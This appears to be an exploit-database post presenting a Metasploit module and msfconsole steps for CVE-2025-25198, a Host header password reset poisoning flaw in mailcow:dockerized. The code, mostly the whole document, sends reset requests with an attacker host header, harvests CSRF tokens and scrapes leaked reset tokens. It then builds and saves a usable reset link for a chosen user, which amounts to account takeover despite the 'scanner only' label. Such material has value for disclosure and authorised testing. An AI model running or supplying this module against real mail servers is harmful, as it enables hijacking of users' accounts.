=============================================================================================================================================
| # Title     : mailcow: dockerized Host Header Password Reset Poisoning Scanner                                                            |
| # Author    : indoushka                                                                                                                   |
| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
| # Vendor    : https://github.com/mailcow/mailcow-dockerized/                                                                              |
=============================================================================================================================================

[+] Summary    : This module adds a scanner for a Host header poisoning vulnerability in mailcow:dockerized versions prior to 2025-01a (CVE-2025-25198).
                 The vulnerability occurs because the application improperly trusts the HTTP Host header when generating password reset links. 
				 By supplying a crafted Host header during the password reset request, it may be possible to influence the generated reset URL.
                 The module performs a safe, non-exploitative check by sending a crafted password reset request and analyzing the server response 
				 for evidence of token leakage (e.g., reset tokens appearing in the Location header or response body). 
				 When a strong indicator is detected, the module reports the vulnerability and stores a proof-of-concept reset link as loot.
                 This is a scanner module only and does not attempt to actively exploit the vulnerability

[+] POC : 

# 1. Save the file : cp mailcow_cve_2025_25198.rb /path/to/metasploit-framework/modules/auxiliary/scanner/http/

# 2. ryn :

msfconsole
msf6 > use auxiliary/scanner/http/mailcow_cve_2025_25198
msf6 > set RHOSTS target.com
msf6 > set USERNAME test@target.com
msf6 > set ATTACKER_HOST attacker.com
msf6 > run


##
# This module requires Metasploit: https://metasploit.com/download
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'mailcow: dockerized Host Header Password Reset Poisoning Scanner',
        'Description' => %q{
          Scans for a Host header poisoning vulnerability in mailcow:dockerized
          versions prior to 2025-01a (CVE-2025-25198).

          The application incorrectly trusts the Host header when generating
          password reset links. This module sends a crafted password reset
          request and analyzes the response for reset token leakage.

          This is a non-exploit scanner module.
        },
        'Author' => [
          'Iam Alvarez',
          'indoushka'
        ],
        'References' => [
          ['CVE', '2025-25198'],
          ['URL', 'https://github.com/mailcow/mailcow-dockerized/security/advisories/GHSA-3mvx-qw4r-fcqf'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2025-25198']
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2025-01-01',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path', '/']),
        OptString.new('USERNAME', [true, 'Test username/email']),
        OptString.new('ATTACKER_HOST', [true, 'Injected Host header value']),
        OptInt.new('MAX_ATTEMPTS', [true, 'Scan attempts per host', 1])
      ]
    )

    register_advanced_options(
      [
        OptBool.new('AUTO_CSRF', [true, 'Auto-extract CSRF token', true])
      ]
    )
  end

  def setup
    super

    @base_uri = normalize_uri(target_uri.path)
    @base_uri = '/' if @base_uri.blank?

    fail_with(Failure::BadConfig, 'USERNAME is required') if datastore['USERNAME'].blank?
    fail_with(Failure::BadConfig, 'ATTACKER_HOST is required') if datastore['ATTACKER_HOST'].blank?

    if datastore['MAX_ATTEMPTS'].to_i <= 0
      fail_with(Failure::BadConfig, 'MAX_ATTEMPTS must be >= 1')
    end
  end

  def run_host(ip)
    vprint_status("Scanning #{ip}")

    csrf_token = datastore['AUTO_CSRF'] ? extract_csrf_token : nil
    username   = datastore['USERNAME']

    datastore['MAX_ATTEMPTS'].times do |attempt|
      vprint_status("Attempt #{attempt + 1}")

      result = check_vulnerability(username, csrf_token)
      next unless result

      if result[:vulnerable]
        report_vulnerability(ip, result)
        return
      end
    end

    vprint_status("No vulnerability detected")
  end

  def extract_csrf_token
    paths = ['/', '/reset-password', '/login']

    paths.each do |path|
      uri = normalize_uri(@base_uri, path)

      res = send_request_cgi(
        'method' => 'GET',
        'uri'    => uri,
        'keep_cookies' => true
      )

      next unless res

      token = extract_csrf_from_response(res)
      return token if token
    rescue Rex::ConnectionError, Rex::TimeoutError
      next
    end

    nil
  end

  def extract_csrf_from_response(res)
    return nil unless res

    body = res.body.to_s

    patterns = [
      /name=["']csrf_token["']\s+value=["']([^"']+)["']/i,
      /name=["']_csrf["']\s+value=["']([^"']+)["']/i
    ]

    patterns.each do |regex|
      return Regexp.last_match(1) if body =~ regex
    end

    nil
  end

  def check_vulnerability(username, csrf_token)
    uri = normalize_uri(@base_uri, 'reset-password')

    origin = "#{ssl ? 'https' : 'http'}://#{rhost}:#{rport}"

    headers = {
      'Host' => datastore['ATTACKER_HOST'],
      'Content-Type' => 'application/x-www-form-urlencoded',
      'Origin' => origin,
      'Referer' => origin
    }

    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => uri,
      'headers'   => headers,
      'vars_post' => {
        'username' => username,
        'pw_reset_request' => '',
        'csrf_token' => csrf_token.to_s
      },
      'keep_cookies' => true
    )

    return nil unless res

    analyze_response(res)
  rescue Rex::ConnectionError, Rex::TimeoutError
    nil
  end

  def analyze_response(res)
    result = {
      vulnerable: false,
      token: nil,
      evidence: []
    }

    location = res.headers&.[]('Location')
    body     = res.body.to_s

    if location && location =~ /token=([^\s"&'<>]+)/
      result[:vulnerable] = true
      result[:token]      = Regexp.last_match(1)
      result[:evidence] << 'Token found in Location header'
      return result
    end

    if body =~ /reset-password\?token=([^\s"&'<>]+)/
      result[:vulnerable] = true
      result[:token]      = Regexp.last_match(1)
      result[:evidence] << 'Token found in response body'
      return result
    end

    result
  end

  def report_vulnerability(ip, result)
    report_vuln(
      host: ip,
      port: rport,
      name: name,
      refs: references,
      info: result[:evidence].join(', ')
    )

    if result[:token]
      poc_link = build_reset_link(result[:token])

      loot_path = store_loot(
        'mailcow.reset_link',
        'text/plain',
        ip,
        poc_link,
        "mailcow_reset_link_#{ip}.txt"
      )

      print_good("#{ip} is vulnerable")
      print_good("PoC saved: #{loot_path}")
      print_good("Reset link: #{poc_link}")
    else
      print_good("#{ip} appears vulnerable")
    end
  end

  def build_reset_link(token)
    "#{ssl ? 'https' : 'http'}://#{rhost}:#{rport}#{normalize_uri(@base_uri, 'reset-password')}?token=#{token}"
  end
end

		
Greetings to :======================================================================
jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
====================================================================================